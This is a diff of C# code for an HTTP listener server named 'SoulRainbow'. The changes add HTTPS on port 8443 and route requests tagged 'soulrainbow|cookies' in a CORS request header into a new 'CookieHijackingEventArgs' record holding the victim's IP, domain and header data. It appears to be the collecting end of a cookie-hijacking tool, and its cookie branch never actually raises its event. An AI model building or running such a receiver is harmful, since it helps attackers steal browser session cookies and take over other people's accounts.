@@ -40,7 +40,9 @@ namespace SoulRainbow
 
             //setting prefixes for http
             listener.Prefixes.Add("http://*:" + port + "/");
-            //listener.Prefixes.Add("https://*:8443/");
+            listener.Prefixes.Add("https://*:8443/");
+            //listener.Prefixes.Add("http://*:80/");
+
             listener.Start();
             listener.BeginGetContext(onCallback, null);
 
@@ -60,8 +62,6 @@ namespace SoulRainbow
             {
                 HttpListenerContext context = listener.EndGetContext(ar);
 
-
-
                 //This line prevents server teardowns
                 listener.BeginGetContext(onCallback, null);
 
@@ -75,12 +75,34 @@ namespace SoulRainbow
                     //TODO: when we have a domain change '*' to 'www.domain.com'
                     context.Response.AppendHeader("Access-Control-Allow-Origin", "*");
 
-                    
+
                     //send the request to be displayed in the program connections list
-                    var data = new ProcessEventArgs();
-                    data.clientIP = context.Request.UserHostAddress;
-                    data.additionalInfo = context.Request.Headers.Get("Access-Control-Request-Headers");
-                    OnClientRecieved(data);
+                    try
+                    {
+                        string accessControlHeader = context.Request.Headers.Get("Access-Control-Request-Headers");
+
+                        if (accessControlHeader.Contains("soulrainbow|cookies"))
+                        {
+                            var data = new CookieHijackingEventArgs();
+                            data.ClientIP = context.Request.UserHostAddress;
+                            data.Domain = context.Request.UserHostName;
+                            data.AdditionalInfo = accessControlHeader;
+                        }
+                        else if (accessControlHeader.Contains("soulrainbow|xml"))
+                        {
+                            var data = new ProcessEventArgs();
+                            data.clientIP = context.Request.UserHostAddress;
+                            data.additionalInfo = accessControlHeader;
+                            OnClientRecieved(data);
+                        }
+                    }
+                    catch
+                    {
+                        var data = new ProcessEventArgs();
+                        data.clientIP = context.Request.UserHostAddress;
+                        data.additionalInfo = "normal client on your site";
+                        OnClientRecieved(data);
+                    }
 
 
                     //converts to ASCII 
@@ -94,7 +116,7 @@ namespace SoulRainbow
                 else
                 {
                     //in case if the url dont include the virtual directory root folder redirects by default to them 
-                    context.Response.Redirect(@"https://192.168.1.229:8443/index");
+                    //context.Response.Redirect(@"http://192.168.1.229:8443/index");
                     context.Response.Close();
 
                 }
@@ -155,6 +177,7 @@ namespace SoulRainbow
         
         //Event Handlers
         public event EventHandler<ProcessEventArgs> clientRecieved;
+        public event EventHandler<CookieHijackingEventArgs> CookieRecieved;
 
     }
 
@@ -162,6 +185,13 @@ namespace SoulRainbow
     {
         public string clientIP { get; set; }
         public string additionalInfo { get; set; }
+    }
+
+    public class CookieHijackingEventArgs : EventArgs
+    {
+        public string ClientIP { get; set; }
+        public string Domain { get; set; }
+        public string AdditionalInfo { get; set; }
     }
 
 
